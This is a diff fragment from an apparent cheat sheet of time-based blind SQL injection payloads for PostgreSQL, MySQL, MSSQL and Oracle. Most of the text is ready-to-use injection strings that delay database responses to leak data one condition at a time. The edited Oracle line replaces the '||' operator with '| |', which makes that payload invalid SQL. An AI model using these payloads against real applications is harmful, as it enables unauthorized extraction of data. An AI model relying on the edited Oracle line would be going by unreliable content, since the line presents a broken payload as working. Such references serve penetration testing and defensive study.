@@ -46,7 +46,7 @@ CASE WHEN (condition is true) THEN pg_sleep(10) ELSE pg_sleep(0) END
 | PostgreSQL | `'%3BSELECT CASE WHEN (condition) THEN pg_sleep(10) ELSE pg_sleep(0) END--` |
 | MySQL | `' AND SLEEP(10)=IF(condition,1,0)--` |
 | MSSQL | `'; IF (condition) WAITFOR DELAY '0:0:10'--` |
-| Oracle | `'||CASE WHEN (condition) THEN dbms_pipe.receive_message('a',10) ELSE '' END--` |
+| Oracle | `'| |CASE WHEN (condition) THEN dbms_pipe.receive_message('a',10) ELSE '' END--` |
 
 ---
 
